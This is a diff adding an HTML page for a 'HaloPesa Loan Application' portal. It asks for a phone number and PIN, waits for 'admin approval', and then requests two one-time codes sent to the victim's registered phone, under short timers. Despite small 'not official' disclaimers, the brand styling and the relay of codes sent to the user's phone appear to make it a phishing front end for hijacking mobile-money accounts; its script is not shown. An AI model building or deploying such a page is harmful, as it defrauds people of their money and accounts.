@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#f4511e">
+  <title>HaloPesa Loan Application</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+<main class="app">
+  <header class="topbar">
+    <div class="brand-mark">H</div>
+    <div><div class="brand">HaloPesa Loan Application</div><div class="subbrand">Loan application • Secure • Fast</div></div>
+    <div class="secure">🔒</div>
+  </header>
+
+  <div class="notice">
+    <strong>HaloPesa Disbursement</strong>
+    <span>Independent loan application portal. Never enter your HaloPesa PIN.</span>
+  </div>
+
+  <div class="steps" aria-label="Application progress">
+    <span class="step active">1</span><i></i><span class="step">2</span><i></i><span class="step">3</span>
+  </div>
+
+  <section class="page active" data-page="1">
+    <div class="hero"><div class="icon">📱</div><h1>Application Login</h1>
+      <p>Enter your phone number and application PIN.</p></div>
+    <form id="loginForm" class="card form-card">
+      <label>Phone number</label>
+      <input id="phone" required placeholder="07XXXXXXXX" inputmode="tel" autocomplete="tel">
+      <label>Application PIN</label>
+      <input id="portalPin" required minlength="4" maxlength="6" inputmode="numeric"
+             pattern="[0-9]{4,6}" placeholder="4–6 digit PIN" autocomplete="off">
+      <div class="hint">Use only the PIN created for this loan application. Do not enter your HaloPesa PIN.</div>
+      <button class="primary" id="startApplication" type="submit">CONTINUE <span>→</span></button>
+      <div class="error hidden" id="loginError"></div>
+
+      <div class="waiting hidden" id="approvalWaiting">
+        <div class="spinner"></div>
+        <strong>Awaiting admin approval</strong>
+        <span>Your application has been submitted. Please wait while an authorized administrator reviews it.</span>
+        <small>Application: <b id="applicationNumber">—</b></small>
+      </div>
+    </form>
+  </section>
+
+  <section class="page" data-page="2">
+    <div class="hero"><div class="icon">🔢</div><h1>Application Code</h1>
+      <p>Your application has been approved. Enter the application code sent to your registered phone.</p></div>
+    <div class="card form-card">
+      <div class="offer">
+        <span>Application</span><strong id="codeApplicationNumber">LP-—</strong>
+      </div>
+      <label>Application code</label>
+      <input id="verificationCode" maxlength="6" inputmode="numeric" placeholder="6-digit code">
+      <div class="timer"><span id="verifyTimer">30</span> seconds</div>
+      <button class="primary" id="verifyCodeBtn">CONTINUE <span>→</span></button>
+      <button class="ghost" id="resendVerification">RESEND CODE</button>
+      <div class="dev-code hidden" id="devVerification"></div>
+      <div class="error hidden" id="page2Error"></div>
+    </div>
+  </section>
+
+  <section class="page" data-page="3">
+    <div class="hero"><div class="icon">💰</div><h1>Loan Amount Confirmation</h1>
+      <p>Confirm the approved loan amount using the confirmation code sent to your registered phone.</p></div>
+    <div class="card form-card">
+      <div class="offer">
+        <span>Approved loan amount</span><strong id="finalAmount">TZS —</strong>
+        <span>Repayment period</span><strong id="finalTerm">—</strong>
+        <span>Monthly payment</span><strong id="finalMonthly">TZS —</strong>
+        <span>Total repayment</span><strong id="finalTotal">TZS —</strong>
+      </div>
+      <label>Loan amount confirmation code</label>
+      <input id="confirmationCode" maxlength="6" inputmode="numeric" placeholder="6-digit code">
+      <div class="timer"><span id="confirmTimer">30</span> seconds</div>
+      <button class="primary" id="confirmBtn">CONFIRM LOAN AMOUNT <span>→</span></button>
+      <button class="ghost" id="resendConfirmation">RESEND CODE</button>
+      <div class="dev-code hidden" id="devConfirmation"></div>
+      <div class="error hidden" id="page3Error"></div>
+    </div>
+  </section>
+
+  <section class="page" data-page="success">
+    <div class="success-card">
+      <div class="big-check">✓</div>
+      <h1>Congratulations!</h1>
+      <p>Your loan has been approved and is being processed for disbursement to your registered HaloPesa line within 24 hours.</p>
+      <div class="brand-disclaimer">Independent loan application portal — not an official HaloPesa service.</div>
+      <div class="application-number" id="successNumber">LP-—</div>
+      <small>Keep this application number for reference.</small>
+    </div>
+  </section>
+
+  <footer><span>🔒 Secure application</span><span>•</span><span>HaloPesa disbursement workflow</span></footer>
+</main>
+<script src="/app.js"></script>
+</body>
+</html>
